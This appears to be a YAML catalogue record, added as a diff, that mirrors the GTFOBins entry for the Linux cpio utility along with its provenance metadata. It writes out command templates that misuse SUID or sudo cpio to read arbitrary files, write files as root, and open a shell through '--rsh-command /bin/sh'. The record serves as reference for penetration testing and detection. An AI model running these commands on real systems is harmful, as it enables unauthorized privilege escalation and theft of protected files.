@@ -1,0 +1,121 @@
+id: gtfobins/cpio/file-read/suid
+type: binary
+platform: linux
+name: cpio
+phases:
+- collection
+- privilege-escalation
+capabilities:
+- file-read
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: echo /path/to/input-file | cpio -o
+  comment: The content of the file is printed to standard output, between the `cpio` archive format header
+    and footer.
+- template: 'echo /path/to/input-file | cpio -R $UID -dp .
+
+    cat path/to/input-file'
+  comment: The whole directory structure is copied to `.`, hence this is also a file write.
+references:
+- https://gtfobins.github.io/gtfobins/cpio/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        cpio:
+          functions:
+            file-read:
+            - binary: false
+              code: echo /path/to/input-file | cpio -o
+              comment: The content of the file is printed to standard output, between the `cpio` archive
+                format header and footer.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            - code: 'echo /path/to/input-file | cpio -dp .
+
+                cat path/to/input-file'
+              comment: The whole directory structure is copied to `.`, hence this is also a file write.
+              contexts:
+                sudo:
+                  code: 'echo /path/to/input-file | cpio -R $UID -dp .
+
+                    cat path/to/input-file'
+                suid:
+                  code: 'echo /path/to/input-file | cpio -R $UID -dp .
+
+                    cat path/to/input-file'
+                unprivileged: null
+            file-write:
+            - code: 'echo DATA >/path/to/temp-file
+
+                echo /path/to/temp-file | cpio -udp .'
+              comment: The whole directory structure is copied to `.`, with the data written to `./path/to/temp-file`.
+              contexts:
+                sudo:
+                  code: 'echo DATA >/path/to/temp-file
+
+                    echo /path/to/temp-file | cpio -R 0:0 -udp .'
+                suid:
+                  code: 'echo DATA >/path/to/temp-file
+
+                    echo /path/to/temp-file | cpio -R 0:0 -udp .'
+                unprivileged: null
+            shell:
+            - code: 'echo ''/bin/sh </dev/tty >/dev/tty'' >localhost
+
+                cpio -o --rsh-command /bin/sh -F localhost:'
+              contexts:
+                sudo: null
+    upstream_url: https://gtfobins.github.io/gtfobins/cpio/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-read
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: collection
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:be758f0f3561c53df58ef5f4e937a5e07ec9c78fb139e2e4a6ec440271fb1363
